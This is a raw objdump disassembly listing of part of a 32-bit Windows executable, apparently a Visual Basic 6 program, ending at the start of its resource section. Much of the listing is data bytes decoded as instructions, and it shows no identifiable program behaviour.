  4085d4:	08 12                	or     %dl,(%edx)
  4085d6:	3b 87 40 01 12 00    	cmp    0x120140(%edi),%eax
  4085dc:	f5                   	cmc
  4085dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4085de:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4085df:	3e 09 b5 76 d0 de 03 	or     %esi,%ds:0x3ded076(%ebp)
  4085e6:	db e9                	fucomi %st(1),%st
  4085e8:	30 a8 d3 7f a9 3a    	xor    %ch,0x3aa97fd3(%eax)
  4085ee:	0e                   	push   %cs
  4085ef:	8a be 0c b7 03 84    	mov    -0x7bfc48f4(%esi),%bh
  4085f5:	f6 0d 5a 46 25 2f 6b 	testb  $0x6b,0x2f25465a
  4085fc:	15 e8 77 cc 6f       	adc    $0x6fcc77e8,%eax
  408601:	79 dd                	jns    0x4085e0
  408603:	bc 58 06 d5 67       	mov    $0x67d50658,%esp
  408608:	95                   	xchg   %eax,%ebp
  408609:	a8 9f                	test   $0x9f,%al
  40860b:	28 7b 04             	sub    %bh,0x4(%ebx)
  40860e:	3e 4e                	ds dec %esi
  408610:	3a ad 9b 9e e7 b0    	cmp    -0x4f186165(%ebp),%ch
  408616:	60                   	pusha
  408617:	80 7c 78 79 9e       	cmpb   $0x9e,0x79(%eax,%edi,2)
  40861c:	e7 79                	out    %eax,$0x79
  40861e:	64 60                	fs pusha
  408620:	5c                   	pop    %esp
  408621:	58                   	pop    %eax
  408622:	54                   	push   %esp
  408623:	50                   	push   %eax
  408624:	e7 79                	out    %eax,$0x79
  408626:	9e                   	sahf
  408627:	e7 4c                	out    %eax,$0x4c
  408629:	48                   	dec    %eax
  40862a:	44                   	inc    %esp
  40862b:	40                   	inc    %eax
  40862c:	3c 9e                	cmp    $0x9e,%al
  40862e:	e7 79                	out    %eax,$0x79
  408630:	9e                   	sahf
  408631:	38 34 30             	cmp    %dh,(%eax,%esi,1)
  408634:	2c 28                	sub    $0x28,%al
  408636:	90                   	nop
  408637:	9e                   	sahf
  408638:	e5 79                	in     $0x79,%eax
  40863a:	24 20                	and    $0x20,%al
  40863c:	1c 40                	sbb    $0x40,%al
  40863e:	cd cb                	int    $0xcb
  408640:	40                   	inc    %eax
  408641:	4f                   	dec    %edi
  408642:	d1 bc 77 b8 ff 16 31 	sarl   $1,0x3116ffb8(%edi,%esi,2)
  408649:	f7 b0 d8 a6 c8 fc    	divl   -0x3375928(%eax)
  40864f:	dc e7                	fsub   %st,%st(7)
  408651:	79 9e                	jns    0x4085f1
  408653:	e7 bc                	out    %eax,$0xbc
  408655:	9c                   	pushf
  408656:	7c 6c                	jl     0x4086c4
  408658:	4c                   	dec    %esp
  408659:	b2 50                	mov    $0x50,%dl
  40865b:	7a 9e                	jp     0x4085fb
  40865d:	2c 0c                	sub    $0xc,%al
  40865f:	f3 3c 87             	repz cmp $0x87,%al
  408662:	e5 cc                	in     $0xcc,%eax
  408664:	ac                   	lods   %ds:(%esi),%al
  408665:	9c                   	pushf
  408666:	7c be                	jl     0x408626
  408668:	f4                   	hlt
  408669:	3c cf                	cmp    $0xcf,%al
  40866b:	5c                   	pop    %esp
  40866c:	3c 1c                	cmp    $0x1c,%al
  40866e:	e7 79                	out    %eax,$0x79
  408670:	0e                   	push   %cs
  408671:	0b fa                	or     %edx,%edi
  408673:	fa                   	cli
  408674:	fa                   	cli
  408675:	3c cf                	cmp    $0xcf,%al
  408677:	73 b8                	jae    0x408631
  408679:	5c                   	pop    %esp
  40867a:	3c 1c                	cmp    $0x1c,%al
  40867c:	fc                   	cld
  40867d:	d3 61 b9             	shll   %cl,-0x47(%ecx)
  408680:	cc                   	int3
  408681:	dc f8                	fdivr  %st,%st(0)
  408683:	30 21                	xor    %ah,(%ecx)
  408685:	74 96                	je     0x40861d
  408687:	02 13                	add    (%ebx),%dl
  408689:	1b 5b d9             	sbb    -0x27(%ebx),%ebx
  40868c:	44                   	inc    %esp
  40868d:	54                   	push   %esp
  40868e:	0b 2d 63 27 22 0d    	or     0xd222763,%ebp
  408694:	75 5c                	jne    0x4086f2
  408696:	c7                   	(bad)
  408697:	25 0e 0f c7 75       	and    $0x75c70f0e,%eax
  40869c:	5c                   	pop    %esp
  40869d:	c7                   	(bad)
  40869e:	10 11                	adc    %dl,(%ecx)
  4086a0:	12 5c c7 75          	adc    0x75(%edi,%eax,8),%bl
  4086a4:	5c                   	pop    %esp
  4086a5:	13 14 75 5c c7 75 15 	adc    0x1575c75c(,%esi,2),%edx
  4086ac:	16                   	push   %ss
  4086ad:	17                   	pop    %ss
  4086ae:	c7                   	(bad)
  4086af:	75 5c                	jne    0x40870d
  4086b1:	c7                   	(bad)
  4086b2:	18 19                	sbb    %bl,(%ecx)
  4086b4:	1a 5c c7 75          	sbb    0x75(%edi,%eax,8),%bl
  4086b8:	5c                   	pop    %esp
  4086b9:	1b 1c 75 5c c7 75 1d 	sbb    0x1d75c75c(,%esi,2),%ebx
  4086c0:	1e                   	push   %ds
  4086c1:	1f                   	pop    %ds
  4086c2:	c7                   	(bad)
  4086c3:	75 5c                	jne    0x408721
  4086c5:	c7                   	(bad)
  4086c6:	20 21                	and    %ah,(%ecx)
  4086c8:	22 5c c7 75          	and    0x75(%edi,%eax,8),%bl
  4086cc:	5c                   	pop    %esp
  4086cd:	23 24 75 5c c7 75 25 	and    0x2575c75c(,%esi,2),%esp
  4086d4:	26 27                	es daa
  4086d6:	c7                   	(bad)
  4086d7:	75 5c                	jne    0x408735
  4086d9:	c7                   	(bad)
  4086da:	28 29                	sub    %ch,(%ecx)
  4086dc:	2a 5c c7 75          	sub    0x75(%edi,%eax,8),%bl
  4086e0:	5c                   	pop    %esp
  4086e1:	2b 2c 75 5c c7 75 2d 	sub    0x2d75c75c(,%esi,2),%ebp
  4086e8:	2e 2f                	cs das
  4086ea:	c7                   	(bad)
  4086eb:	75 5c                	jne    0x408749
  4086ed:	c7                   	(bad)
  4086ee:	30 31                	xor    %dh,(%ecx)
  4086f0:	32 5c c7 75          	xor    0x75(%edi,%eax,8),%bl
  4086f4:	5c                   	pop    %esp
  4086f5:	33 34 75 5c c7 75 35 	xor    0x3575c75c(,%esi,2),%esi
  4086fc:	36 37                	ss aaa
  4086fe:	c7                   	(bad)
  4086ff:	75 5c                	jne    0x40875d
  408701:	c7 38 39 3a 5c       	xbegin 0x5c7ac03e,(bad)
  408706:	c7                   	(bad)
  408707:	75 5c                	jne    0x408765
  408709:	3b 3c 75 5c c7 75 3d 	cmp    0x3d75c75c(,%esi,2),%edi
  408710:	3e 3f                	ds aas
  408712:	c7                   	(bad)
  408713:	75 5c                	jne    0x408771
  408715:	c7 40 41 42 5c c7 75 	movl   $0x75c75c42,0x41(%eax)
  40871c:	5c                   	pop    %esp
  40871d:	43                   	inc    %ebx
  40871e:	44                   	inc    %esp
  40871f:	75 5c                	jne    0x40877d
  408721:	c7                   	(bad)
  408722:	75 45                	jne    0x408769
  408724:	46                   	inc    %esi
  408725:	47                   	inc    %edi
  408726:	c7                   	(bad)
  408727:	75 5c                	jne    0x408785
  408729:	c7                   	(bad)
  40872a:	48                   	dec    %eax
  40872b:	49                   	dec    %ecx
  40872c:	4a                   	dec    %edx
  40872d:	d7                   	xlat   %ds:(%ebx)
  40872e:	d9 75 5c             	fnstenv 0x5c(%ebp)
  408731:	4b                   	dec    %ebx
  408732:	4c                   	dec    %esp
  408733:	1d d7 71 1d 4d       	sbb    $0x4d1d71d7,%eax
  408738:	4e                   	dec    %esi
  408739:	4f                   	dec    %edi
  40873a:	71 1d                	jno    0x408759
  40873c:	d7                   	xlat   %ds:(%ebx)
  40873d:	71 50                	jno    0x40878f
  40873f:	51                   	push   %ecx
  408740:	52                   	push   %edx
  408741:	d7                   	xlat   %ds:(%ebx)
  408742:	71 1d                	jno    0x408761
  408744:	d7                   	xlat   %ds:(%ebx)
  408745:	53                   	push   %ebx
  408746:	54                   	push   %esp
  408747:	67 d7                	xlat   %ds:(%bx)
  408749:	71 1d                	jno    0x408768
  40874b:	55                   	push   %ebp
  40874c:	56                   	push   %esi
  40874d:	57                   	push   %edi
  40874e:	5c                   	pop    %esp
  40874f:	c7                   	(bad)
  408750:	75 5c                	jne    0x4087ae
  408752:	58                   	pop    %eax
  408753:	59                   	pop    %ecx
  408754:	75 5c                	jne    0x4087b2
  408756:	c7                   	(bad)
  408757:	75 5a                	jne    0x4087b3
  408759:	5b                   	pop    %ebx
  40875a:	5c                   	pop    %esp
  40875b:	c7                   	(bad)
  40875c:	75 5c                	jne    0x4087ba
  40875e:	c7                   	(bad)
  40875f:	5d                   	pop    %ebp
  408760:	5e                   	pop    %esi
  408761:	5f                   	pop    %edi
  408762:	5c                   	pop    %esp
  408763:	c7                   	(bad)
  408764:	75 5c                	jne    0x4087c2
  408766:	60                   	pusha
  408767:	61                   	popa
  408768:	75 5c                	jne    0x4087c6
  40876a:	c7                   	(bad)
  40876b:	75 62                	jne    0x4087cf
  40876d:	63 64 c7 75          	arpl   %esp,0x75(%edi,%eax,8)
  408771:	5c                   	pop    %esp
  408772:	c7                   	(bad)
  408773:	65 66 67 5c          	gs addr16 pop %sp
  408777:	c7                   	(bad)
  408778:	75 5c                	jne    0x4087d6
  40877a:	68 69 75 5c c7       	push   $0xc75c7569
  40877f:	75 6a                	jne    0x4087eb
  408781:	6b 6c c7 75 5c       	imul   $0x5c,0x75(%edi,%eax,8),%ebp
  408786:	c7                   	(bad)
  408787:	6d                   	insl   (%dx),%es:(%edi)
  408788:	6e                   	outsb  %ds:(%esi),(%dx)
  408789:	6f                   	outsl  %ds:(%esi),(%dx)
  40878a:	5c                   	pop    %esp
  40878b:	c7                   	(bad)
  40878c:	75 5c                	jne    0x4087ea
  40878e:	70 71                	jo     0x408801
  408790:	9d                   	popf
  408791:	5d                   	pop    %ebp
  408792:	c7                   	(bad)
  408793:	75 72                	jne    0x408807
  408795:	73 74                	jae    0x40880b
  408797:	71 1d                	jno    0x4087b6
  408799:	d7                   	xlat   %ds:(%ebx)
  40879a:	71 75                	jno    0x408811
  40879c:	76 77                	jbe    0x408815
  40879e:	d7                   	xlat   %ds:(%ebx)
  40879f:	71 1d                	jno    0x4087be
  4087a1:	d7                   	xlat   %ds:(%ebx)
  4087a2:	78 79                	js     0x40881d
  4087a4:	1d d7 71 1d 7a       	sbb    $0x7a1d71d7,%eax
  4087a9:	7b 7c                	jnp    0x408827
  4087ab:	71 1d                	jno    0x4087ca
  4087ad:	d7                   	xlat   %ds:(%ebx)
  4087ae:	71 7d                	jno    0x40882d
  4087b0:	7e 7f                	jle    0x408831
  4087b2:	d7                   	xlat   %ds:(%ebx)
  4087b3:	71 1d                	jno    0x4087d2
  4087b5:	d7                   	xlat   %ds:(%ebx)
  4087b6:	80 81 1d d7 71 1d 82 	addb   $0x82,0x1d71d71d(%ecx)
  4087bd:	83 84 71 1d d7 71 85 	addl   $0xffffff86,-0x7a8e28e3(%ecx,%esi,2)
  4087c4:	86 
  4087c5:	87 d7                	xchg   %edx,%edi
  4087c7:	71 1d                	jno    0x4087e6
  4087c9:	d7                   	xlat   %ds:(%ebx)
  4087ca:	88 89 1d d7 71 1d    	mov    %cl,0x1d71d71d(%ecx)
  4087d0:	8a 8b 8c 71 1d d7    	mov    -0x28e28e74(%ebx),%cl
  4087d6:	71 8d                	jno    0x408765
  4087d8:	8e 8f d7 71 1d d7    	mov    -0x28e28e29(%edi),%cs
  4087de:	90                   	nop
  4087df:	91                   	xchg   %eax,%ecx
  4087e0:	1d d7 71 1d 92       	sbb    $0x921d71d7,%eax
  4087e5:	93                   	xchg   %eax,%ebx
  4087e6:	94                   	xchg   %eax,%esp
  4087e7:	71 1d                	jno    0x408806
  4087e9:	d7                   	xlat   %ds:(%ebx)
  4087ea:	71 95                	jno    0x408781
  4087ec:	96                   	xchg   %eax,%esi
  4087ed:	97                   	xchg   %eax,%edi
  4087ee:	d7                   	xlat   %ds:(%ebx)
  4087ef:	71 1d                	jno    0x40880e
  4087f1:	d7                   	xlat   %ds:(%ebx)
  4087f2:	98                   	cwtl
  4087f3:	99                   	cltd
  4087f4:	1d d7 71 1d 9a       	sbb    $0x9a1d71d7,%eax
  4087f9:	9b                   	fwait
  4087fa:	9c                   	pushf
  4087fb:	71 1d                	jno    0x40881a
  4087fd:	d7                   	xlat   %ds:(%ebx)
  4087fe:	71 9d                	jno    0x40879d
  408800:	9e                   	sahf
  408801:	9f                   	lahf
  408802:	d7                   	xlat   %ds:(%ebx)
  408803:	71 1d                	jno    0x408822
  408805:	d7                   	xlat   %ds:(%ebx)
  408806:	a0 a1 1d d7 71       	mov    0x71d71da1,%al
  40880b:	1d a2 a3 a4 71       	sbb    $0x71a4a3a2,%eax
  408810:	1d d7 71 a5 a6       	sbb    $0xa6a571d7,%eax
  408815:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  408816:	d7                   	xlat   %ds:(%ebx)
  408817:	71 1d                	jno    0x408836
  408819:	d7                   	xlat   %ds:(%ebx)
  40881a:	a8 a9                	test   $0xa9,%al
  40881c:	1d d7 71 1d aa       	sbb    $0xaa1d71d7,%eax
  408821:	ab                   	stos   %eax,%es:(%edi)
  408822:	ac                   	lods   %ds:(%esi),%al
  408823:	71 1d                	jno    0x408842
  408825:	d7                   	xlat   %ds:(%ebx)
  408826:	71 ad                	jno    0x4087d5
  408828:	ae                   	scas   %es:(%edi),%al
  408829:	af                   	scas   %es:(%edi),%eax
  40882a:	d7                   	xlat   %ds:(%ebx)
  40882b:	71 1d                	jno    0x40884a
  40882d:	d7                   	xlat   %ds:(%ebx)
  40882e:	b0 b1                	mov    $0xb1,%al
  408830:	1d d7 71 1d b2       	sbb    $0xb21d71d7,%eax
  408835:	b3 b4                	mov    $0xb4,%bl
  408837:	71 1d                	jno    0x408856
  408839:	d7                   	xlat   %ds:(%ebx)
  40883a:	71 b5                	jno    0x4087f1
  40883c:	b6 b7                	mov    $0xb7,%dh
  40883e:	d7                   	xlat   %ds:(%ebx)
  40883f:	71 1d                	jno    0x40885e
  408841:	d7                   	xlat   %ds:(%ebx)
  408842:	b8 b9 1d d7 71       	mov    $0x71d71db9,%eax
  408847:	1d ba bb bc 71       	sbb    $0x71bcbbba,%eax
  40884c:	1d d7 71 bd be       	sbb    $0xbebd71d7,%eax
  408851:	bf d7 71 1d d7       	mov    $0xd71d71d7,%edi
  408856:	c0 c1 1d             	rol    $0x1d,%cl
  408859:	d7                   	xlat   %ds:(%ebx)
  40885a:	71 1d                	jno    0x408879
  40885c:	c2 c3 c4             	ret    $0xc4c3
  40885f:	71 1d                	jno    0x40887e
  408861:	d7                   	xlat   %ds:(%ebx)
  408862:	71 c5                	jno    0x408829
  408864:	c6 c7 11             	mov    $0x11,%bh
  408867:	53                   	push   %ebx
  408868:	1d d7 c8 eb 2a       	sbb    $0x2aebc8d7,%eax
  40886d:	10 87 68 32 ee 99    	adc    %al,-0x6611cd98(%edi)
  408873:	88 86 00 4c 0e e7    	mov    %al,-0x18f1b400(%esi)
  408879:	9d                   	popf
  40887a:	c0 a2 e9 cc 9e 1c 58 	shlb   $0x58,0x1c9ecce9(%edx)
  408881:	5c                   	pop    %esp
  408882:	8b cc                	mov    %esp,%ecx
  408884:	84 ff                	test   %bh,%bh
  408886:	94                   	xchg   %eax,%esp
  408887:	e0 d0                	loopne 0x408859
  408889:	77 5d                	ja     0x4088e8
  40888b:	85 14 b9             	test   %edx,(%ecx,%edi,4)
  40888e:	2d 3b a2 04 0e       	sub    $0xe04a23b,%eax
  408893:	87 43 5e             	xchg   %eax,0x5e(%ebx)
  408896:	05 80 06 80 72       	add    $0x72800680,%eax
  40889b:	cf                   	iret
  40889c:	f3 1c 16             	repz sbb $0x16,%al
  40889f:	80 2a 51             	subb   $0x51,(%edx)
  4088a2:	52                   	push   %edx
  4088a3:	53                   	push   %ebx
  4088a4:	3c cf                	cmp    $0xcf,%al
  4088a6:	f3 3c 56             	repz cmp $0x56,%al
  4088a9:	08 09                	or     %cl,(%ecx)
  4088ab:	0a 0b                	or     (%ebx),%cl
  4088ad:	77 98                	ja     0x408847
  4088af:	3c cf                	cmp    $0xcf,%al
  4088b1:	f3 0d 78 0e b4 b9    	repz or $0xb9b40e78,%eax
  4088b7:	2c cf                	sub    $0xcf,%al
  4088b9:	f3 11 30             	repz adc %esi,(%eax)
  4088bc:	c8 da 58 2e          	enter  $0x58da,$0x2e
  4088c0:	cb                   	lret
  4088c1:	61                   	popa
  4088c2:	58                   	pop    %eax
  4088c3:	59                   	pop    %ecx
  4088c4:	0c 8b                	or     $0x8b,%al
  4088c6:	cb                   	lret
  4088c7:	72 f0                	jb     0x4088b9
  4088c9:	0c 86                	or     $0x86,%al
  4088cb:	9e                   	sahf
  4088cc:	c3                   	ret
  4088cd:	69 5b c6 5e 5b 9e e7 	imul   $0xe79e5b5e,-0x3a(%ebx),%ebx
  4088d4:	79 5f                	jns    0x408935
  4088d6:	60                   	pusha
  4088d7:	cc                   	int3
  4088d8:	16                   	push   %ss
  4088d9:	22 f3                	and    %bl,%dh
  4088db:	3c cf                	cmp    $0xcf,%al
  4088dd:	f3 17                	repz pop %ss
  4088df:	19 85 88 3d 62 58    	sbb    %eax,0x58623d88(%ebp)
  4088e5:	3c cf                	cmp    $0xcf,%al
  4088e7:	40                   	inc    %eax
  4088e8:	42                   	inc    %edx
  4088e9:	64 00 62 79          	add    %ah,%fs:0x79(%edx)
  4088ed:	1e                   	push   %ds
  4088ee:	47                   	inc    %edi
  4088ef:	c7 02 68 69 1e 00    	movl   $0x1e6968,(%edx)
  4088f5:	aa                   	stos   %al,%es:(%edi)
  4088f6:	b6 e7                	mov    $0xe7,%dh
  4088f8:	23 4d 53             	and    0x53(%ebp),%ecx
  4088fb:	56                   	push   %esi
  4088fc:	42                   	inc    %edx
  4088fd:	56                   	push   %esi
  4088fe:	4d                   	dec    %ebp
  4088ff:	36 c0 d3 28          	ss rcl $0x28,%bl
  408903:	61                   	popa
  408904:	30 4d 65             	xor    %cl,0x65(%ebp)
  408907:	74 68                	je     0x408971
  408909:	01 86 09 84 45 6e    	add    %eax,0x6e458409(%esi)
  40890f:	67 69 6e 65 03 00 a0 	imul   $0x68a00003,0x65(%bp),%ebp
  408916:	68 
  408917:	45                   	inc    %ebp
  408918:	56                   	push   %esi
  408919:	45                   	inc    %ebp
  40891a:	4e                   	dec    %esi
  40891b:	54                   	push   %esp
  40891c:	5f                   	pop    %edi
  40891d:	53                   	push   %ebx
  40891e:	49                   	dec    %ecx
  40891f:	4e                   	dec    %esi
  408920:	4b                   	dec    %ebx
  408921:	5f                   	pop    %edi
  408922:	41                   	inc    %ecx
  408923:	64 64 52             	fs fs push %edx
  408926:	65 66 d4 80          	gs data16 aam $0x80
  40892a:	b2 45                	mov    $0x45,%dl
  40892c:	6c                   	insb   (%dx),%es:(%edi)
  40892d:	46                   	inc    %esi
  40892e:	75 6e                	jne    0x40899e
  408930:	63 13                	arpl   %edx,(%ebx)
  408932:	7b e8                	jnp    0x40891c
  408934:	a1 0b 88 e7 cb       	mov    0xcbe7880b,%eax
  408939:	6c                   	insb   (%dx),%es:(%edi)
  40893a:	65 61                	gs popa
  40893c:	73 86                	jae    0x4088c4
  40893e:	52                   	push   %edx
  40893f:	52                   	push   %edx
  408940:	ed                   	in     (%dx),%eax
  408941:	66 a3 2a f5 b2 00    	mov    %ax,0xb2f52a
  408947:	e2 16                	loop   0x40895f
  408949:	66 61                	popaw
  40894b:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  40894e:	76 62                	jbe    0x4089b2
  408950:	61                   	popa
  408951:	45                   	inc    %ebp
  408952:	78 9a                	js     0x4088ee
  408954:	87 42 c3             	xchg   %eax,-0x3d(%edx)
  408957:	70 74                	jo     0x4089cd
  408959:	a1 80 14 2f 72       	mov    0x722f1480,%eax
  40895e:	40                   	inc    %eax
  40895f:	ee                   	out    %al,(%dx)
  408960:	5f                   	pop    %edi
  408961:	d6                   	salc
	...

Disassembly of section .rsrc:

0041d000 <.rsrc>:
  41d000:	00 00                	add    %al,(%eax)
  41d002:	00 00                	add    %al,(%eax)
  41d004:	35 07 7a 44 00       	xor    $0x447a07,%eax
  41d009:	00 00                	add    %al,(%eax)
  41d00b:	00 00                	add    %al,(%eax)
  41d00d:	00 02                	add    %al,(%edx)
  41d00f:	00 03                	add    %al,(%ebx)
  41d011:	00 00                	add    %al,(%eax)
  41d013:	00 20                	add    %ah,(%eax)
  41d015:	00 00                	add    %al,(%eax)
  41d017:	80 0e 00             	orb    $0x0,(%esi)
  41d01a:	00 00                	add    %al,(%eax)
  41d01c:	60                   	pusha
  41d01d:	00 00                	add    %al,(%eax)
  41d01f:	80 00 00             	addb   $0x0,(%eax)
  41d022:	00 00                	add    %al,(%eax)
  41d024:	35 07 7a 44 00       	xor    $0x447a07,%eax
  41d029:	00 00                	add    %al,(%eax)
  41d02b:	00 00                	add    %al,(%eax)
  41d02d:	00 01                	add    %al,(%ecx)
  41d02f:	00 31                	add    %dh,(%ecx)
  41d031:	75 00                	jne    0x41d033
  41d033:	00 38                	add    %bh,(%eax)
  41d035:	00 00                	add    %al,(%eax)
  41d037:	80 00 00             	addb   $0x0,(%eax)
  41d03a:	00 00                	add    %al,(%eax)
  41d03c:	35 07 7a 44 00       	xor    $0x447a07,%eax
  41d041:	00 00                	add    %al,(%eax)
  41d043:	00 00                	add    %al,(%eax)
  41d045:	00 01                	add    %al,(%ecx)
  41d047:	00 00                	add    %al,(%eax)
  41d049:	00 00                	add    %al,(%eax)
  41d04b:	00 50 00             	add    %dl,0x0(%eax)
  41d04e:	00 00                	add    %al,(%eax)
  41d050:	a0 d0 01 00 a8       	mov    0xa80001d0,%al
  41d055:	0e                   	push   %cs
  41d056:	00 00                	add    %al,(%eax)
  41d058:	b0 04                	mov    $0x4,%al
	...
  41d062:	00 00                	add    %al,(%eax)
  41d064:	35 07 7a 44 00       	xor    $0x447a07,%eax
  41d069:	00 00                	add    %al,(%eax)
  41d06b:	00 00                	add    %al,(%eax)
  41d06d:	00 01                	add    %al,(%ecx)
  41d06f:	00 01                	add    %al,(%ecx)
  41d071:	00 00                	add    %al,(%eax)
  41d073:	00 78 00             	add    %bh,0x0(%eax)
  41d076:	00 80 00 00 00 00    	add    %al,0x0(%eax)
  41d07c:	35 07 7a 44 00       	xor    $0x447a07,%eax
  41d081:	00 00                	add    %al,(%eax)
  41d083:	00 00                	add    %al,(%eax)
  41d085:	00 01                	add    %al,(%ecx)
  41d087:	00 00                	add    %al,(%eax)
  41d089:	00 00                	add    %al,(%eax)
  41d08b:	00 90 00 00 00 48    	add    %dl,0x48000000(%eax)
  41d091:	df 01                	filds  (%ecx)
  41d093:	00 14 00             	add    %dl,(%eax,%eax,1)
  41d096:	00 00                	add    %al,(%eax)
  41d098:	b0 04                	mov    $0x4,%al
  41d09a:	00 00                	add    %al,(%eax)
  41d09c:	00 00                	add    %al,(%eax)
  41d09e:	00 00                	add    %al,(%eax)
  41d0a0:	28 00                	sub    %al,(%eax)
  41d0a2:	00 00                	add    %al,(%eax)
  41d0a4:	30 00                	xor    %al,(%eax)
  41d0a6:	00 00                	add    %al,(%eax)
  41d0a8:	60                   	pusha
  41d0a9:	00 00                	add    %al,(%eax)
  41d0ab:	00 01                	add    %al,(%ecx)
  41d0ad:	00 08                	add    %cl,(%eax)
	...
  41d0cb:	00 ff                	add    %bh,%bh
  41d0cd:	ff                   	(bad)
  41d0ce:	ff 00                	incl   (%eax)
  41d0d0:	00 00                	add    %al,(%eax)
  41d0d2:	00 00                	add    %al,(%eax)
  41d0d4:	9c                   	pushf
  41d0d5:	ff                   	(bad)
  41d0d6:	ff 00                	incl   (%eax)
  41d0d8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41d0d9:	ff                   	(bad)
  41d0da:	ff 00                	incl   (%eax)
  41d0dc:	ad                   	lods   %ds:(%esi),%eax
  41d0dd:	ff                   	(bad)
  41d0de:	ff 00                	incl   (%eax)
  41d0e0:	b5 ff                	mov    $0xff,%ch
  41d0e2:	ff 00                	incl   (%eax)
  41d0e4:	bd ff ff 00 c6       	mov    $0xc600ffff,%ebp
  41d0e9:	ff                   	(bad)
  41d0ea:	ff 00                	incl   (%eax)
  41d0ec:	ce                   	into
  41d0ed:	ff                   	(bad)
  41d0ee:	ff 00                	incl   (%eax)
  41d0f0:	d6                   	salc
  41d0f1:	ff                   	(bad)
  41d0f2:	ff 00                	incl   (%eax)
  41d0f4:	de ff                	fdivrp %st,%st(7)
  41d0f6:	ff 00                	incl   (%eax)
  41d0f8:	e7 ff                	out    %eax,$0xff
  41d0fa:	ff 00                	incl   (%eax)
  41d0fc:	ef                   	out    %eax,(%dx)
  41d0fd:	ff                   	(bad)
  41d0fe:	ff 00                	incl   (%eax)
  41d100:	f7 ff                	idiv   %edi
  41d102:	ff 00                	incl   (%eax)
  41d104:	8c fb                	mov    %?,%ebx
  41d106:	ff 00                	incl   (%eax)
  41d108:	94                   	xchg   %eax,%esp
  41d109:	fb                   	sti
  41d10a:	ff 00                	incl   (%eax)
  41d10c:	ad                   	lods   %ds:(%esi),%eax
  41d10d:	fb                   	sti
  41d10e:	ff 00                	incl   (%eax)
  41d110:	7b ef                	jnp    0x41d101
  41d112:	f7 00 8c f7 ff 00    	testl  $0xfff78c,(%eax)
  41d118:	c6                   	(bad)
  41d119:	fb                   	sti
  41d11a:	ff 00                	incl   (%eax)
  41d11c:	ce                   	into
  41d11d:	fb                   	sti
  41d11e:	ff 00                	incl   (%eax)
  41d120:	84 f3                	test   %dh,%bl
  41d122:	ff 00                	incl   (%eax)
  41d124:	8c f3                	mov    %?,%ebx
  41d126:	ff 00                	incl   (%eax)
  41d128:	9c                   	pushf
  41d129:	ef                   	out    %eax,(%dx)
  41d12a:	f7 00 a5 f7 ff 00    	testl  $0xfff7a5,(%eax)
  41d130:	b5 f7                	mov    $0xf7,%ch
  41d132:	ff 00                	incl   (%eax)
  41d134:	d6                   	salc
  41d135:	fb                   	sti
  41d136:	ff 00                	incl   (%eax)
  41d138:	73 e7                	jae    0x41d121
  41d13a:	f7 00 84 ef ff 00    	testl  $0xffef84,(%eax)
  41d140:	9c                   	pushf
  41d141:	f3 ff 00             	repz incl (%eax)
  41d144:	de fb                	fdivrp %st,%st(3)
  41d146:	ff 00                	incl   (%eax)
  41d148:	4a                   	dec    %edx
  41d149:	cf                   	iret
  41d14a:	e7 00                	out    %eax,$0x0
  41d14c:	63 db                	arpl   %ebx,%ebx
  41d14e:	ef                   	out    %eax,(%dx)
  41d14f:	00 7b eb             	add    %bh,-0x15(%ebx)
  41d152:	ff 00                	incl   (%eax)
  41d154:	8c ef                	mov    %gs,%edi
  41d156:	ff 00                	incl   (%eax)
  41d158:	8c e7                	mov    %fs,%edi
  41d15a:	f7 00 ad f3 ff 00    	testl  $0xfff3ad,(%eax)
  41d160:	5a                   	pop    %edx
  41d161:	cf                   	iret
  41d162:	e7 00                	out    %eax,$0x0
  41d164:	6b df f7             	imul   $0xfffffff7,%edi,%ebx
  41d167:	00 84 eb ff 00 9c ef 	add    %al,-0x1063ff01(%ebx,%ebp,8)
  41d16e:	ff 00                	incl   (%eax)
  41d170:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41d171:	ef                   	out    %eax,(%dx)
  41d172:	ff 00                	incl   (%eax)
  41d174:	b5 f3                	mov    $0xf3,%ch
  41d176:	ff 00                	incl   (%eax)
  41d178:	ce                   	into
  41d179:	f7 ff                	idiv   %edi
  41d17b:	00 e7                	add    %ah,%bh
  41d17d:	fb                   	sti
  41d17e:	ff 00                	incl   (%eax)
  41d180:	39 be de 00 42 c7    	cmp    %edi,-0x38bdff22(%esi)
  41d186:	e7 00                	out    %eax,$0x0
  41d188:	6b cf e7             	imul   $0xffffffe7,%edi,%ecx
  41d18b:	00 84 e7 ff 00 94 eb 	add    %al,-0x146bff01(%edi,%eiz,8)
  41d192:	ff 00                	incl   (%eax)
  41d194:	8c db                	mov    %ds,%ebx
  41d196:	ef                   	out    %eax,(%dx)
  41d197:	00 ce                	add    %cl,%dh
  41d199:	ef                   	out    %eax,(%dx)
  41d19a:	f7 00 29 b6 de 00    	testl  $0xdeb629,(%eax)
  41d1a0:	31 ba de 00 31 9e    	xor    %edi,-0x61ceff22(%edx)
  41d1a6:	bd 00 52 cf ef       	mov    $0xefcf5200,%ebp
  41d1ab:	00 5a cf             	add    %bl,-0x31(%edx)
  41d1ae:	ef                   	out    %eax,(%dx)
  41d1af:	00 63 d7             	add    %ah,-0x29(%ebx)
  41d1b2:	f7 00 6b d3 ef 00    	testl  $0xefd36b,(%eax)
  41d1b8:	7b e3                	jnp    0x41d19d
  41d1ba:	ff 00                	incl   (%eax)
  41d1bc:	7b cf                	jnp    0x41d18d
  41d1be:	e7 00                	out    %eax,$0x0
  41d1c0:	8c e7                	mov    %fs,%edi
  41d1c2:	ff 00                	incl   (%eax)
  41d1c4:	ad                   	lods   %ds:(%esi),%eax
  41d1c5:	e7 f7                	out    %eax,$0xf7
  41d1c7:	00 b5 ef ff 00 c6    	add    %dh,-0x39ff0011(%ebp)
  41d1cd:	f3 ff 00             	repz incl (%eax)
  41d1d0:	00 9e ce 00 00 96    	add    %bl,-0x69ffff32(%esi)
  41d1d6:	c6 00 08             	movb   $0x8,(%eax)
  41d1d9:	9e                   	sahf
  41d1da:	ce                   	into
  41d1db:	00 08                	add    %cl,(%eax)
  41d1dd:	92                   	xchg   %eax,%edx
  41d1de:	bd 00 08 8a b5       	mov    $0xb58a0800,%ebp
  41d1e3:	00 10                	add    %dl,(%eax)
  41d1e5:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  41d1e6:	d6                   	salc
  41d1e7:	00 18                	add    %bl,(%eax)
